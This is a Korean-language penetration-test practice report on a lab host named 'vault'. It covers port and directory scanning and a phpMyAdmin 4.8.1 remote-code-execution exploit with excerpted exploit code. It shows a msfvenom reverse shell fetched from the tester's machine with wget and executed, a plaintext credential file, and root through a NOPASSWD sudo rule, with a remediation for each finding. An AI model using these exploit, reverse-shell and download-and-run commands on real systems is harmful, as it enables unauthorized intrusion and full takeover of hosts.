@@ -1,0 +1,420 @@
+---
+title: "vault"
+categories:
+  - pt
+tags:
+  - 모의해킹 실습
+layout: archive
+author_profile: true
+sidebar_main: true
+---
+# vault 노트
+
+## 목차
+1. 개요
+    1. 총평
+    2. 취약점 목차
+2. 모의해킹 수행 내용
+    1. 정보 수집
+    2. 취약점 진단
+    3. 호스트 초기 침투
+    4. 권한 상승
+3. 취약점
+    1. 사용자 입력값 검증 누락 - phpMyAdmin 4.8.1
+    2. 하드코딩된 계정 정보
+    3. 잘못된 sudoers 설정
+
+## 개요
+### 총평
+|분석 기간|호스트 이름|IP 주소|목적|
+|--------|--------|--------|--------|
+|2024년 8월 21일|vault|172.31.249.155|보안 취약점 진단 및 침투테스트|
+
+
+본 보고서는 2024년 8월 21일 진행된 vault 호스트에 대한 모의해킹 작업을 요약한다. 이 과정에서 발견된 취약점과 그에 따른 침투 테스트 결과를 중점적으로 다룬다.
+
+점검자는 phpMyAdmin의 target 파라미터 검증 누락을 이용해 호스트에 침투했다. 호스트 정보수집을 통해 루트 디렉토리에서 퍼미션 777로 설정되어 있는 .bobbyz_cred.txt 파일을 발견하였고, 이를 통해 하드코딩된 *bobbyz* 사용자의 계정 정보를 획득했다. 획득한 계정 정보와 SSH를 이용하여 vault 호스트로의 침투에 성공했다. 그 뒤, `sudo -l` 명령어를 사용하여 sudo 명령어 사용 권한을 확인했고, `sudo /bin/bash` 명령어 사용시 패스워드를 입력하지 않아도 루트 권한의 쉘을 획득하는 것을 확인하였다. 그 뒤, `sudo /bin/bash` 명령어를 사용하여 최종적으로 호스트에서 root 유저 권한을 얻었다.
+
+결과적으로 테스터는 이번 모의해킹을 통해 외부 공격자가 vault 호스트를 완벽하게 장악할 수 있는 취약점들을 발견했다. 해당 호스트는 외부 인터넷에 노출되어 있는 상태다. 이는 인터넷에서 해당 호스트에 접근 가능한 모든 공격자들에게 해당 호스트가 장악당할 위험이 있는 상태를 의미한다. 인터넷에 노출되어 있는 호스트의 특성상 점검자는 취약점을 발견한 즉시 보안 담당자에게 연락해 취약점 정보를 제공할 필요가 있다.
+
+### 진단 결과 요약
+ - 아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.
+
+|번호|이름|중요도|설명|대응 방안|
+|--------|--------|--------|--------|--------|
+|1|사용자 입력값 검증 누락 - phpMyAdmin 4.8.1|상|phpMyAdmin 4.8.1 버전의 index.php 페이지에 target 파라미터 검증 누락이 있어 원격 코드 실행 공격이 가능|phpMyAdmin 버전 업데이트|
+|2|하드코딩된 계정 정보|상|루트 디렉토리에 bobbyz 사용자의 계정 정보가 하드코딩된 파일이 존재하여 해당 계정으로 ssh 접속 가능|하드코딩된 계정 정보를 가지고 있는 파일을 제거하거나 해당 파일의 퍼미션을 변경|
+|3|잘못된 sudoers 설정|상|해당 설정으로 인하여 bobbyz 사용자가 패스워드 없이 루트 권한의 쉘 획득 가능|sudoers 파일에서 NOPASSWD 설정 해제|
+
+## 모의해킹 수행 내용
+### 정보 수집 - 포트스캔
+`nmap`을 사용하여 네트워크 스캔을 진행하니 tcp 22번(ssh) 포트와 80번(http) 포트 확인
+    ```sh
+    sudo nmap -sS -p- 172.31.249.155 -Pn -n --open -oA tcpAll
+
+    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 02:55 EDT
+    Nmap scan report for 172.31.249.155
+    Host is up (0.013s latency).
+    Not shown: 65533 closed tcp ports (reset)
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+
+    Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
+    ```
+### 정보 수집 - 웹
+ 80번 포트가 열려있으므로 브라우저를 통해 웹 사이트를 접근하여 확인해보니 우분투 서버와 아파치를 사용한 웹사이트 확인
+ 
+ ![alt text](image.png)
+
+ - 웹 서버의 기술 스택, robots.txt 등을 확인하였으나 자세한 정보를 얻을 수 없었기에 gobuster를 사용하여 웹 디렉토리 브루트포싱을 진행하니 /phpmyadmin 발견
+    ```sh
+    gobuster dir -u http://172.31.249.155 -w /usr/share/dirb/wordlists/common.txt
+
+    [...]
+
+    /phpmyadmin           (Status: 301) [Size: 321] [--> http://172.31.249.155/phpmyadmin/]
+    ```
+ - phpmyadmin 페이지에 접근시 로그인 페이지 확인
+
+    ![alt text](image-1.png)
+
+ - phpmyadmin 페이지에 php 기본 어드민 id:password 입력하여 로그인 시도
+
+    ![alt text](image-2.png)
+
+ - 로그인 성공 후 페이지 확인 결과 phpmyadmin 버전 확인
+
+    ![alt text](image-3.png)
+
+### 취약점 진단
+ phpmyadmin 4.8.1버전 취약점 확인 결과 RCE 취약점 발견
+    ```sh
+    searchsploit phpmyadmin 4.8.1
+
+    ---------------------------------------------------------------------------------------
+    Exploit Title                                                  |  Path
+    ---------------------------------------------------------------------------------------
+    phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)     | php/webapps/44924.txt
+    phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)     | php/webapps/44928.txt
+    phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                  | php/webapps/50457.py
+    ---------------------------------------------------------------------------------------
+    Shellcodes: No Results
+    ```
+
+### 호스트 초기 침투
+ - RCE 취약점을 통한 공격 테스트 진행 및 개념증명 성공
+    ```sh
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password whoami
+
+    www-data
+    ```
+ - 개념증명이 성공 했으므로 리버스 쉘 연결을 위한 리버스 쉘 페이로드 생성 및 nc를 사용하여 리버스 쉘 연결 포트 오픈
+    ```bash
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.0.140 LPORT=443 -f elf -o revshell.elf
+
+    nc -lvnp 443
+    ```
+
+ - 임의의 포트를 오픈한 뒤 RCE 취약점을 사용하여 리버스 쉘 전송 및 실행
+    ```sh
+    python3 -m http.server 3333
+
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "wget http:10.8.0.140:3333/revshell.elf -O /tmp/reverse"
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "chmod +x /tmp/reverse"
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "/tmp/reverse"
+    ```
+
+ - 호스트 리버스 쉘 연결 성공
+    ```sh
+    listening on [any] 443 ...
+    connect to [10.8.0.140] from (UNKNOWN) [172.31.249.155] 34848
+    whoami;hostname;id
+    www-data
+    ip-172-31-249-155
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    ```
+
+### 권한 상승
+- 수동으로 호스트 점검 결과 루트 디렉토리에 퍼미션 777인 .bobbyz_creds.txt 파일 발견
+    ```sh
+    find / -type f -perm 777 2>/dev/null
+
+    /.bobbyz_creds.txt
+    ```
+
+ - .bobbyz_creds.txt 파일 확인 결과 bobbyz 계정 아이디와 패스워드 확인
+    ```sh
+    cat ./.bobbyz_creds.txt
+
+    Vault server breakglass creds - bobbyz:qwerty12
+    ```
+ - SSH를 사용하여 해당 ID로 호스트 로그인 시도
+    ```sh
+    ssh bobbyz@172.31.249.155
+
+    bobbyz@ip-172-31-249-155:~$ whoami; hostname; id
+    bobbyz
+    ip-172-31-249-155
+    uid=1001(bobbyz) gid=1001(bobbyz) groups=1001(bobbyz)
+    ```
+
+ - bobbyz 계정으로 로그인 한 뒤 `sudo -l` 명령어를 사용하여 확인결과 bobbyz 계정은 패스워드 사용없이 bash 쉘 사용 가능
+    ```sh
+    bobbyz@ip-172-31-249-155:~$ sudo -l
+    Matching Defaults entries for bobbyz on ip-172-31-249-155:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User bobbyz may run the following commands on ip-172-31-249-155:
+        (ALL) NOPASSWD: /bin/bash
+    ```
+
+ - `sudo /bin/bash`명령어를 사용하여 root권한으로 로그인 성공
+    ```sh
+    bobbyz@ip-172-31-249-155:/$ sudo /bin/bash
+    root@ip-172-31-249-155:/# whoami; hostname; id
+
+    root
+    ip-172-31-249-155
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
+
+## 취약점
+### 1. phpMyadmin 4.8.1 사용자 입력값 검증 누락
+#### 취약점 개요
+<table>
+  <tr>
+    <td> 정보 </td>
+    <td> 설명 </td>
+  </tr><tr>
+    <td> 이름 </td>
+    <td> 사용자 입력값 검증 누락 - phpMyAdmin 4.8.1 </td>
+  </tr><tr>
+    <td> 중요도 </td>
+    <td> 상 </td>
+  </tr><tr>
+    <td rowspan="3"> 위치 </td>
+    <td> URL: http://172.31.249.155/phpmyadmin/index.php </td>
+    </tr> <tr>
+    <td> 요청 파라미터: target </td>
+    </tr> <tr>
+    <td> 파일 위치: /var/lib/php/sessions/sess_사용자세션ID </td>
+    </tr>
+  </tr>
+</table>
+
+#### 취약점 설명
+ - phpmyadmin 4.8.1 버전의 경우 /index.php 내부의 target이란 파라미터에 대한 유효성 검증을 하지 않아 생기는 취약점을 이용한 공격으로 확인 된다.
+
+ - target 파라미터를 core.php의 checkPageValidit 함수에서 검증을 하는 것을 확인할 수 있는데 checkPageValidit 함수를 살펴보면 ?로 시작하는 문자열을 찾아 $_page에 저장하고 이를 $goto_whitelist에 있는 문자열 들과 비교하여 일치할 경우 True값을 반환하고 include 함수를 통해 접근할 수 있는 것으로 확인 된다.
+    ```c
+    if (! empty($_REQUEST['target'])
+        && is_string($_REQUEST['target'])
+        && ! preg_match('/^index/', $_REQUEST['target'])
+        && ! in_array($_REQUEST['target'], $target_blacklist)
+        && Core::checkPageValidity($_REQUEST['target'])
+    ) {
+        include $_REQUEST['target'];
+        exit;
+    }
+    ------------------------------------------------------------------------
+    public static function checkPageValidity(&$page, array $whitelist = [])
+        {
+            //1.
+            if (empty($whitelist)) {
+                $whitelist = self::$goto_whitelist; 
+            }
+            //2.
+            if (! isset($page) || !is_string($page)) {
+                return false;
+            }
+            //3.
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            //4.
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+                            [...]
+    ------------------------------------------------------------------------
+    class Core
+    {
+        public static $goto_whitelist = array(
+                        [...]
+            'db_sql.php',
+                        [...]
+        );
+                        [...]
+    }
+    ```
+ - excute query 부분에서 /import.php를 불러와 데이터 부분에 사용자가 사용할 페이로드(command)를 삽입하여 본문과 함께 POST 요청을 통해 sql쿼리 문을 실행하고 실행된 쿼리가 새로 생성된 사용자의 세션 파일에 포함되며 excute payload 부분에서 사용자의 PHP세션 파일을 불러오는 것으로 보인다.
+    ```c
+    if len(sys.argv) < 7:                      
+    usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
+        Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""                   
+    print(usage.format(sys.argv[0],sys.argv[0]))
+    exit()
+                        [...]
+    # 3rd req: execute query
+    url2 = url + "/import.php"
+    # payload
+    payload = '''select '<?php system("{}") ?>';'''.format(command)
+    p = {'table':'', 'token': token, 'sql_query': payload }
+    r = requests.post(url2, cookies = cookies, data = p)
+    if r.status_code != 200:
+    print("Query failed")
+    exit()
+
+    # 4th req: execute payload
+    session_id = cookies.get_dict()['phpMyAdmin']
+    url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
+    r = requests.get(url3, cookies = cookies)
+    if r.status_code != 200:
+    print("Exploit failed")
+    exit()
+
+                        [...]
+    ```
+
+  - 정리하면 /import.php에 페이로드를 추가하여 POST형식으로 전달하여 sql쿼리를 실행하고 이로 인해 생성된 사용자의 세션파일안에 쿼리값이 포함되며
+  `/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)`를 target 파라미터에 삽입을 시도하나 checkPageValidity 함수에서 ?기준으로 검증을 하고 있으므로 처음에는 `db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)`가 $_page 값으로 반환되고 다시 mb_substr함수를 통하여 $_page 값으로 반한된 `db_sql.php`가 $goto_whitelist에 들어있는 문자열 중 하나와 일치하므로 checkPageValidity 함수가 True 값을 반환하여 이로인해 include 함수에 포함된 세션파일 안의 포함되어 있는 사용자가 입력한 원격 코드가 실행되는 것으로 보인다.
+
+#### 개념 증명
+ - 점검자는 칼리 리눅스 내 `searchsploit` 도구를 사용하여 phpMyAdmin 4.8.1 원격코드 실행 개념 증명 익스플로잇 코드를 확보했다. 이후, 개념 증명을 위한 리버스 쉘 페이로드를 생성하였으며, 명령어는 다음과 같다.
+    ```sh
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.0.140 LPORT=443 -f elf -o revshell.elf
+    ```
+ - 익스플로잇 코드를 통하여 생성한 리버스 쉘을 호스트에 전송하고 실행권한을 준 뒤 이를 수행하였고, 익스플로잇 성공을 확인했다.
+    ```sh
+    # 익스플로잇 코드를 통해 리버스 쉘 전송
+    └ # python3 -m http.server 3333
+
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "wget http:10.8.0.140:3333/revshell.elf -O /tmp/reverse"
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "chmod +x /tmp/reverse"
+    python3 50457.py 172.31.249.155 80 /phpmyadmin root password "/tmp/reverse"
+
+    # 리버스 쉘 획득
+    └ # nc -lvnp 443
+
+    listening on [any] 443 ...
+    connect to [10.8.0.140] from (UNKNOWN) [172.31.249.155] 34848
+    whoami;hostname;id
+    www-data
+    ip-172-31-249-155
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    ```
+
+#### 대응 방안
+ - phpmyadmin을 최신버전인 5.2.1 버전으로 업데이트해 알려진 취약점을 해결한다.
+
+ - phpmyadmin 로그인 계정 및 패스워드를 default 값이 아닌 임의의 값으로 변경한다.
+
+#### 레퍼런스
+ - phpMyAdmin 최신버전 https://www.phpmyadmin.net/downloads/
+ - phpMyAdmin 버전 4.8.1 개념 증명 익스플로잇 https://www.exploit-db.com/exploits/50457
+
+### 2. 하드코딩 된 계정 정보
+#### 취약점 개요
+|정보|설명|
+|----|----|
+|이름|하드코딩 된 계정 정보|
+|중요도|상|
+|위치|파일 위치: 루트 디렉토리 /.bobbyz_cred.txt|
+
+#### 취약점 설명
+ - 호스트 내의 .bobbyz_creds.txt 파일안에 하드코딩된 bobbyz 사용자의 계정 정보가 노출되어 있어 이를 통해 ssh를 사용하여 호스트로 접근 가능한 취약점으로 확인 된다.
+
+#### 개념 증명
+ - 호스트에서 `find / -type f -perm 0777` 명령어를 사용하여 퍼미션이 777인 /.bobbyz_cred.txt 파일을 발견하였고 cat 명령어를 사용하여 확인하니 bobbyz 사용자의 계정정보를 확인했다.
+    ```sh
+    # find 명령어를 사용하여 파일타입의 퍼미션이 777인 파일 모두 검색
+    └ # find / -type f -perm 777 2>/dev/null
+
+    /.bobbyz_creds.txt
+
+    # cat 명령어를 사용하여 파일안에 하드코딩 되어있는 bobbyz 사용자 계정 정보 획득
+    └ # cat ./.bobbyz_creds.txt
+
+    Vault server breakglass creds - bobbyz:qwerty12
+    ```
+
+ - ssh를 사용하여 획득한 bobbyz 계정으로 접근을 시도했고 성공을 확인했다.
+    ```sh
+    # bobbyz 사용자 계정으로 ssh 연결 성공
+
+    ssh bobbyz@172.31.249.155
+
+    bobbyz@ip-172-31-249-155:~$ whoami; hostname; id
+    bobbyz
+    ip-172-31-249-155
+    uid=1001(bobbyz) gid=1001(bobbyz) groups=1001(bobbyz)
+    ```
+#### 대응 방안
+ - 하드코딩 되어 있는 파일을 제거한다.
+    ```sh
+    rm -rf ./.bobbyz_cred.txt
+    ```
+
+ - 파일 제거가 어려울 경우 파일의 권한을 파일 소유자만이 확인할 수 있도록 퍼미션을 변경한다.
+    ```sh
+    chmod 400 ./.bobbyz_cred.txt
+    ```
+#### 레퍼런스
+
+### 3. 잘못된 sudoers 설정
+#### 취약점 개요
+|정보|설명|
+|----|----|
+|이름|잘못된 sudoers 설정|
+|중요도|상|
+|위치|파일 위치: /etc/sudoers|
+
+#### 취약점 설명
+ - bobbyz 사용자의 sudo 권한을 잘못 설정하여 패스워드를 입력하지 않고 root 쉘 권한을 획득할 수 있는 취약점으로 확인된다.
+
+#### 개념 증명
+ - 호스트에서 ssh를 통하여 bobbyz 계정으로 로그인 한 뒤 `sudo -l` 명령어를 사용하여 bobbyz 사용자가 sudo 명령어를 사용하여 /bin/bash 쉘을 루트 권한으로 패스워드 없이 접근 가능한 것을 확인했다. 이후, `sudo /bin/bash`명령어를 사용하여 root 권한의 쉘을 획득했다.
+    ```sh
+    # sudo -l 명령어를 사용하여 sudo 권한 확인
+
+    bobbyz@ip-172-31-249-155:~$ sudo -l
+    Matching Defaults entries for bobbyz on ip-172-31-249-155:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User bobbyz may run the following commands on ip-172-31-249-155:
+        (ALL) NOPASSWD: /bin/bash
+
+    # sudo /bin/bash 명령어를 사용하여 root 권한 쉘 획득
+
+    bobbyz@ip-172-31-249-155:/$ sudo /bin/bash
+    root@ip-172-31-249-155:/# whoami; hostname; id
+
+    root
+    ip-172-31-249-155
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
+
+#### 대응 방안
+ - /etc/sudoers 파일에서 bobbyz 사용자의 NOPASSWD를 제거한다.
+    ```sh
+    # 수정전
+    bobbyz (ALL) NOPASSWD:/bin/bash
+    # 수정후
+    bobbyz (ALL) /bin/bash
+    ```
+- /etc/sudoers 파일에서 bobbyz 사용자의 실행가능한 명령어를 /bin/bash가 아닌 필요한 명령어로 변경한다.
+    ```sh
+    # 수정전
+    bobbyz (ALL) /bin/bash
+    # 수정후
+    bobbyz (ALL) 필요한 명령어
+    ```
+
+#### 레퍼런스
